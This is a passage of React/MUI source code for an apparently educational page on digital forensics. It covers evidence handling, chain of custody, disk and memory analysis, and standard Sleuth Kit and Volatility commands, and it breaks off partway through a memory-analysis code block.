                ].map((type) => (
                  <Grid item xs={12} sm={6} md={4} key={type.title}>
                    <Paper sx={{ p: 2, bgcolor: themeColors.bgNested, border: `1px solid ${type.color}30`, height: "100%" }}>
                      <Typography sx={{ color: type.color, fontWeight: 600, mb: 0.5 }}>{type.title}</Typography>
                      <Typography variant="body2" sx={{ color: themeColors.textMuted }}>{type.desc}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
              <Alert severity="info" sx={{ bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                <strong>Golden Rule:</strong> Never work on original evidence. Always create forensic images and work on copies.
              </Alert>

              <Paper sx={{ p: 2.5, mt: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Beginner Workflow: From Scene to Report
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  Digital forensics is not just running tools. It is a repeatable process that preserves evidence,
                  answers specific questions, and produces a defensible report. For beginners, the safest approach
                  is to follow a simple workflow every time. This prevents accidental data changes and keeps your
                  investigation focused.
                </Typography>
                <List dense>
                  {[
                    "Scope the case: define what you are trying to prove or disprove.",
                    "Preserve first: isolate the system, capture volatile data, and create a forensic image.",
                    "Verify integrity: hash originals and images; log the values.",
                    "Analyze the copy: use tools to extract artifacts and timelines.",
                    "Correlate findings: confirm each hypothesis with at least two artifacts.",
                    "Document everything: actions taken, tools used, and results.",
                    "Report with clarity: summarize facts, not assumptions, and attach evidence.",
                  ].map((item) => (
                    <ListItem key={item} sx={{ py: 0.25 }}>
                      <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary, fontSize: 18 }} /></ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" } }} />
                    </ListItem>
                  ))}
                </List>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7 }}>
                  Keep a case notebook from minute one. When you later write a report, that notebook becomes your
                  timeline of actions and your proof that the evidence stayed intact.
                </Typography>
              </Paper>
            </Paper>

            {/* Fundamentals Section */}
            <Paper id="fundamentals" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <GavelIcon /> Digital Forensics Principles
              </Typography>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Why Forensics Is Different From IT Troubleshooting
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  In regular IT work, you fix problems quickly by changing systems. In forensics, you must avoid changes.
                  Every action can alter evidence. That is why forensic work emphasizes write blockers, hashing, and detailed
                  documentation. You are not just fixing a system, you are building a defensible story of what happened.
                </Typography>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7 }}>
                  This mindset also changes how you interpret results. A single artifact rarely proves an action. Instead,
                  you build confidence by combining multiple artifacts: a log entry, a file timestamp, a registry key, and
                  a network record that all point to the same event.
                </Typography>
              </Paper>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Core Principles</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <List>
                    {[
                      ["Identification", "Recognize and document potential evidence sources"],
                      ["Preservation", "Protect evidence integrity - write blockers, hashing"],
                      ["Collection", "Acquire evidence properly - forensic imaging"],
                      ["Analysis", "Examine evidence to find relevant artifacts"],
                      ["Reporting", "Document findings for legal/business use"],
                    ].map(([title, desc]) => (
                      <ListItem key={title}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                        <ListItemText primary={title} secondary={desc} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" }, "& .MuiListItemText-secondary": { color: themeColors.textMuted } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Order of Volatility</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Priority</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Source</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Volatility</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["1", "CPU Registers/Cache", "Nanoseconds"],
                          ["2", "RAM / Running Processes", "Power loss = gone"],
                          ["3", "Network Connections", "Seconds to minutes"],
                          ["4", "Disk (HDD/SSD)", "Persistent until overwritten"],
                          ["5", "Backups / Logs", "Days to years"],
                        ].map(([p, source, vol]) => (
                          <TableRow key={p}>
                            <TableCell><Chip label={p} size="small" sx={{ bgcolor: themeColors.primary }} /></TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{source}</TableCell>
                            <TableCell sx={{ color: themeColors.textMuted }}>{vol}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                  <Alert severity="info" sx={{ mt: 2, bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                    Collect most volatile evidence first. Memory before disk!
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Chain of Custody</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <List dense>
                    {[
                      "Document who collected the evidence, when, and where",
                      "Hash evidence immediately (MD5 + SHA256)",
                      "Log every person who handles the evidence",
                      "Store in tamper-evident containers",
                      "Maintain detailed transfer logs",
                    ].map((item) => (
                      <ListItem key={item}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                        <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" } }} />
                      </ListItem>
                    ))}
                  </List>
                  <CodeBlock
                    language="text"
                    code={`Chain of Custody Form Example:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Case Number: IR-2024-0142
Evidence ID: HDD-001

Item Description: Seagate 1TB HDD, S/N: WD-WMAZA1234567
Collection Date: 2024-01-15 14:32 UTC
Collection Location: Server Room, Rack A3
Collected By: John Smith, Badge #4521

Hash Values (at collection):
  MD5:    d41d8cd98f00b204e9800998ecf8427e
  SHA256: e3b0c44298fc1c149afbf4c8996fb924...

Transfer Log:
Date       | From        | To          | Purpose
-----------+-------------+-------------+------------------
2024-01-15 | J. Smith    | Evidence Rm | Initial storage
2024-01-16 | Evidence Rm | M. Johnson  | Analysis
2024-01-18 | M. Johnson  | Evidence Rm | Return after analysis`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Legal Considerations</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Alert severity="error" sx={{ mb: 2 }}>
                    <strong>Important:</strong> Improper evidence handling can make findings inadmissible in court.
                  </Alert>
                  <List dense>
                    {[
                      ["Authorization", "Ensure you have legal authority to examine the device (consent, warrant, policy)"],
                      ["Jurisdiction", "Understand which laws apply - different rules for criminal vs civil vs internal"],
                      ["Privacy Laws", "GDPR, CCPA, HIPAA may restrict what data you can access and retain"],
                      ["Documentation", "Every action must be documented and reproducible"],
                      ["Expert Testimony", "Be prepared to explain your methods in court if required"],
                    ].map(([title, desc]) => (
                      <ListItem key={title}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.secondary }} /></ListItemIcon>
                        <ListItemText primary={title} secondary={desc} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" }, "& .MuiListItemText-secondary": { color: themeColors.textMuted } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Anti-Forensics Awareness</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Attackers may attempt to destroy or hide evidence. Know what to look for:
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Technique</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Detection Method</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["Timestomping", "Compare $MFT timestamps with $STANDARD_INFO - mismatches indicate tampering"],
                          ["Secure Delete", "Check for file carving hits in unallocated space, USN Journal gaps"],
                          ["Log Clearing", "Event ID 1102 (log cleared), gaps in sequential records"],
                          ["Encryption", "Encrypted containers, BitLocker, VeraCrypt volumes"],
                          ["Steganography", "Statistical analysis of image files, unusual file sizes"],
                          ["Live CD/USB Boot", "No artifacts in main OS, check BIOS logs if available"],
                        ].map(([technique, detection]) => (
                          <TableRow key={technique}>
                            <TableCell sx={{ color: "#f87171", fontWeight: 500 }}>{technique}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{detection}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Tool Installation Quick Start</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Install Volatility 3 (Memory Forensics)
pip install volatility3
vol -h

# Install Sleuth Kit (Disk Forensics)
# Ubuntu/Debian
sudo apt install sleuthkit

# macOS
brew install sleuthkit

# Install YARA (Pattern Matching)
sudo apt install yara
# Or from source for latest:
git clone https://github.com/VirusTotal/yara.git
cd yara && ./bootstrap.sh && ./configure && make && sudo make install

# Install bulk_extractor (Data Carving)
sudo apt install bulk_extractor

# Install Plaso/log2timeline (Timeline)
pip install plaso

# Install Rekall (Memory - Alternative to Volatility)
pip install rekall

# Install Hashdeep (Hashing)
sudo apt install hashdeep

# Verify installations
fls -V          # Sleuth Kit
vol --info      # Volatility 3
yara --version  # YARA
log2timeline.py --version  # Plaso`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Building a Forensic Workstation</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Hardware recommendations for a dedicated forensic workstation:
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>Component</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Minimum</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Recommended</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["CPU", "8 cores", "16+ cores (Ryzen 9 / i9)"],
                          ["RAM", "32 GB", "64-128 GB (for memory forensics)"],
                          ["Storage (OS)", "500 GB NVMe", "1 TB NVMe"],
                          ["Storage (Evidence)", "4 TB HDD", "8+ TB RAID array"],
                          ["Write Blocker", "Software-based", "Hardware write blocker (Tableau)"],
                          ["Network", "Gigabit", "10GbE for large transfers"],
                        ].map(([component, min, rec]) => (
                          <TableRow key={component}>
                            <TableCell sx={{ color: "#a5b4fc" }}>{component}</TableCell>
                            <TableCell sx={{ color: themeColors.textMuted }}>{min}</TableCell>
                            <TableCell sx={{ color: "#4ade80" }}>{rec}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Tools Section */}
            <Paper id="tools" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <BuildIcon /> Essential Forensic Tools
              </Typography>

              <TableContainer component={Paper} sx={{ bgcolor: themeColors.bgNested, mb: 3 }}>
                <Table>
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: themeColors.primary }}>Tool</TableCell>
                      <TableCell sx={{ color: themeColors.primary }}>Type</TableCell>
                      <TableCell sx={{ color: themeColors.primary }}>Platform</TableCell>
                      <TableCell sx={{ color: themeColors.primary }}>Cost</TableCell>
                      <TableCell sx={{ color: themeColors.primary }}>Best For</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {tools.map((tool) => (
                      <TableRow key={tool.name}>
                        <TableCell><Typography sx={{ color: themeColors.primary, fontWeight: 600 }}>{tool.name}</Typography></TableCell>
                        <TableCell sx={{ color: "#e2e8f0" }}>{tool.type}</TableCell>
                        <TableCell sx={{ color: "#e2e8f0" }}>{tool.platform}</TableCell>
                        <TableCell><Chip label={tool.cost} size="small" sx={{ bgcolor: "#4ade80" }} /></TableCell>
                        <TableCell sx={{ color: themeColors.textMuted }}>{tool.best}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Alert severity="success" sx={{ bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                <strong>Recommended Start:</strong> FTK Imager for imaging, Autopsy for analysis, Volatility for memory.
              </Alert>
            </Paper>

            {/* Disk Forensics Section */}
            <Paper id="disk-forensics" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <StorageIcon /> Disk Forensics
              </Typography>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Lesson: How File Systems Tell the Story
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  File systems do more than store files. They also store metadata that reveals user activity. On Windows,
                  the NTFS Master File Table (MFT) records file creation, modification, and access timestamps. The USN
                  Journal records changes over time. Even when a file is deleted, these structures often still contain
                  traces of the file name, path, and timestamps.
                </Typography>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7, mb: 2 }}>
                  Beginners should focus on a few high-value artifacts first: the MFT (what existed), the USN Journal
                  (what changed), LNK files (what was opened), and browser artifacts (what was accessed). As you get more
                  comfortable, you can expand into registry data, shadow copies, and unallocated space carving.
                </Typography>
                <List dense>
                  {[
                    "MFT: authoritative index of files and folders.",
                    "USN Journal: change history for files and directories.",
                    "LNK files: user launched or opened items.",
                    "Shellbags: folder navigation history.",
                    "Recycle Bin: deleted file metadata and paths.",
                  ].map((item) => (
                    <ListItem key={item} sx={{ py: 0.25 }}>
                      <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Creating Forensic Images</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Linux: Create raw image with dc3dd (forensic dd)
dc3dd if=/dev/sda of=evidence.dd hash=sha256 log=imaging.log

# Linux: Create E01 (EnCase) format with ewfacquire
ewfacquire /dev/sda -t evidence -f encase6

# Verify hash after imaging
sha256sum evidence.dd

# Mount image read-only for analysis
mount -o ro,loop,noexec evidence.dd /mnt/evidence`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>File System Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Sleuth Kit commands
mmls evidence.dd              # Show partition layout
fsstat -o 2048 evidence.dd    # File system info (offset in sectors)
fls -r -o 2048 evidence.dd    # List all files recursively
icat -o 2048 evidence.dd 1234 # Extract file by inode

# Find deleted files
fls -rd -o 2048 evidence.dd   # -d = deleted only

# Carve files from unallocated space
foremost -i evidence.dd -o carved_files/
photorec evidence.dd`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Key Areas to Examine</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={2}>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested }}>
                        <Typography sx={{ color: themeColors.primary, fontWeight: 600, mb: 1 }}>User Activity</Typography>
                        <List dense>
                          {["Browser history & cache", "Recent documents", "Download folders", "Recycle Bin / Trash", "Desktop & Documents"].map(i => (
                            <ListItem key={i} sx={{ py: 0 }}>
                              <ListItemText primary={i} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0", fontSize: "0.9rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Paper sx={{ p: 2, bgcolor: themeColors.bgNested }}>
                        <Typography sx={{ color: themeColors.primary, fontWeight: 600, mb: 1 }}>System Artifacts</Typography>
                        <List dense>
                          {["Event logs", "Prefetch files", "Registry hives", "Scheduled tasks", "$MFT / NTFS metadata"].map(i => (
                            <ListItem key={i} sx={{ py: 0 }}>
                              <ListItemText primary={i} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0", fontSize: "0.9rem" } }} />
                            </ListItem>
                          ))}
                        </List>
                      </Paper>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Deleted File Recovery</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# List deleted files (Sleuth Kit)
fls -rd image.dd           # Recursive, deleted only
fls -rd -p image.dd        # With full path

# Recover specific file by inode
icat image.dd 12345 > recovered_file.doc

# Recover all deleted files
tsk_recover -e image.dd ./recovered/

# PhotoRec - File carving (works on any file system)
photorec image.dd

# Scalpel - Custom file carving
scalpel -c scalpel.conf image.dd -o ./carved/

# Foremost - Another carving tool
foremost -t all -i image.dd -o ./carved/

# bulk_extractor - Extract all data types at once
bulk_extractor -o ./bulk_out image.dd`}
                  />
                  <Alert severity="warning" sx={{ mt: 2 }}>
                    Carved files may be fragmented or corrupted. Always validate recovered files.
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>NTFS-Specific Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    NTFS stores critical metadata in special files:
                  </Typography>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: themeColors.primary }}>File</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Purpose</TableCell>
                          <TableCell sx={{ color: themeColors.primary }}>Analysis Command</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["$MFT", "Master File Table - all file metadata", "analyzeMFT.py -f $MFT -o mft.csv"],
                          ["$LogFile", "Transaction log - recent changes", "LogFileParser.py $LogFile"],
                          ["$UsnJrnl", "Change journal - file operations", "usn.py -f $UsnJrnl:$J -o usn.csv"],
                          ["$Secure", "Security descriptors/ACLs", "Requires specialized tools"],
                          ["$Bitmap", "Cluster allocation map", "Shows used/free clusters"],
                        ].map(([file, purpose, cmd]) => (
                          <TableRow key={file}>
                            <TableCell sx={{ color: "#f472b6", fontFamily: "monospace" }}>{file}</TableCell>
                            <TableCell sx={{ color: "#e2e8f0" }}>{purpose}</TableCell>
                            <TableCell sx={{ color: themeColors.secondary, fontFamily: "monospace", fontSize: "0.75rem" }}>{cmd}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                  <CodeBlock
                    language="bash"
                    code={`# Extract $MFT from image
icat image.dd 0 > \$MFT

# Parse MFT with analyzeMFT
pip install analyzeMFT
analyzeMFT.py -f \$MFT -o mft_output.csv

# Extract $UsnJrnl
icat image.dd 62-128 > \$UsnJrnl

# Parse USN Journal
pip install usn
usn.py -f \$UsnJrnl -o usn.csv

# MFTECmd (Windows - Eric Zimmerman's tool)
MFTECmd.exe -f "C:\$MFT" --csv . --csvf mft.csv`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Volume Shadow Copies</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" sx={{ color: themeColors.textMuted, mb: 2 }}>
                    Windows Volume Shadow Copies (VSS) are snapshots that may contain deleted/modified files:
                  </Typography>
                  <CodeBlock
                    language="bash"
                    code={`# List shadow copies (Windows - live system)
vssadmin list shadows

# Mount shadow copy (Windows)
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# List VSS from image (libvshadow)
vshadowinfo image.dd

# Mount all shadow copies
vshadowmount image.dd /mnt/vss

# Access individual shadows
ls /mnt/vss/
# vss1/ vss2/ vss3/ ...

# Compare current vs shadow copy
diff -rq /mnt/current/Users /mnt/vss/vss1/Users

# Arsenal Image Mounter (Windows GUI)
# Can mount E01/DD images with VSS support`}
                  />
                  <Alert severity="info" sx={{ mt: 2 }}>
                    <strong>Tip:</strong> Shadow copies may contain versions of files from before they were encrypted by ransomware!
                  </Alert>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Ext4/Linux File System Analysis</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Display superblock info
fsstat image.dd

# List files with timestamps
fls -l -r image.dd

# Extract inode info
istat image.dd 12345

# Parse ext4 journal
jcat image.dd 8     # Journal is usually inode 8

# Mount read-only for analysis
mount -o ro,loop,noexec image.dd /mnt/evidence

# extundelete - deleted file recovery
extundelete image.dd --restore-all

# Check for rootkits in system binaries
# Compare hashes against known good
find /mnt/evidence/bin -type f -exec md5sum {} \; > system_hashes.txt`}
                  />
                </AccordionDetails>
              </Accordion>
            </Paper>

            {/* Memory Forensics Section */}
            <Paper id="memory-forensics" sx={{ p: 3, mb: 4, bgcolor: themeColors.bgCard, borderRadius: 2, border: `1px solid ${themeColors.border}` }}>
              <Typography variant="h5" sx={{ color: themeColors.primary, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <MemoryIcon /> Memory Forensics
              </Typography>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: themeColors.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#e2e8f0" }}>
                  Lesson: Why Memory Forensics Is a Game Changer
                </Typography>
                <Typography variant="body1" sx={{ color: themeColors.textMuted, lineHeight: 1.8, mb: 2 }}>
                  Memory captures the live state of a system. It reveals running processes, injected code, network
                  connections, and sometimes plaintext credentials. Attackers often rely on "fileless" techniques
                  that never write to disk. If you only examine disk artifacts, you can miss the most important evidence.
                </Typography>
                <Typography variant="body2" sx={{ color: themeColors.textMuted, lineHeight: 1.7 }}>
                  A good beginner approach is to answer three questions from memory: What processes were running?
                  What network connections were open? Are there signs of injected or hidden code? Use those answers
                  to guide deeper disk analysis and containment decisions.
                </Typography>
              </Paper>

              <Alert severity="info" sx={{ mb: 3, bgcolor: `${themeColors.primary}15`, color: "#e2e8f0" }}>
                Memory analysis reveals running processes, network connections, loaded DLLs, and malware that never touched disk.
              </Alert>

              <Accordion defaultExpanded sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" } }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Memory Acquisition</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Windows: FTK Imager (GUI) or WinPmem
winpmem_mini_x64.exe memory.raw

# Linux: Use LiME kernel module
insmod lime.ko "path=/evidence/memory.lime format=lime"

# macOS: osxpmem
sudo osxpmem -o memory.aff4`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Volatility 3 Commands</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Identify OS profile
vol -f memory.raw windows.info

# List processes
vol -f memory.raw windows.pslist
vol -f memory.raw windows.pstree    # Tree view
vol -f memory.raw windows.psscan    # Find hidden processes

# Network connections
vol -f memory.raw windows.netstat
vol -f memory.raw windows.netscan

# Loaded DLLs
vol -f memory.raw windows.dlllist --pid 1234

# Command history
vol -f memory.raw windows.cmdline

# Dump suspicious process
vol -f memory.raw windows.memmap --pid 1234 --dump

# Detect code injection
vol -f memory.raw windows.malfind`}
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>What to Look For</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <List>
                    {[
                      ["Suspicious Processes", "Unknown executables, misspelled system names (scvhost vs svchost)"],
                      ["Network Connections", "Unexpected outbound connections, C2 beacons"],
                      ["Injected Code", "malfind detects executable code in unusual memory regions"],
                      ["Loaded DLLs", "Unsigned DLLs, DLLs loaded from temp folders"],
                      ["Command History", "Attacker commands in cmd/powershell history"],
                    ].map(([title, desc]) => (
                      <ListItem key={title}>
                        <ListItemIcon><CheckCircleIcon sx={{ color: themeColors.primary }} /></ListItemIcon>
                        <ListItemText primary={title} secondary={desc} sx={{ "& .MuiListItemText-primary": { color: "#e2e8f0" }, "& .MuiListItemText-secondary": { color: themeColors.textMuted } }} />
                      </ListItem>
                    ))}
                  </List>
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: themeColors.bgNested, "&:before": { display: "none" }, mt: 2 }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: themeColors.primary }} />}>
                  <Typography variant="h6" sx={{ color: "#e2e8f0" }}>Malware Detection in Memory</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    language="bash"
                    code={`# Detect code injection
vol -f memory.dmp windows.malfind

# Find hidden/unlinked processes
vol -f memory.dmp windows.psxview

# Check for API hooks
vol -f memory.dmp windows.ssdt        # System Service Descriptor Table
vol -f memory.dmp windows.callbacks   # Kernel callbacks

# Detect rootkits
vol -f memory.dmp windows.ldrmodules  # Compare PEB lists
vol -f memory.dmp windows.modscan     # Scan for hidden modules

# Dump suspicious processes for analysis
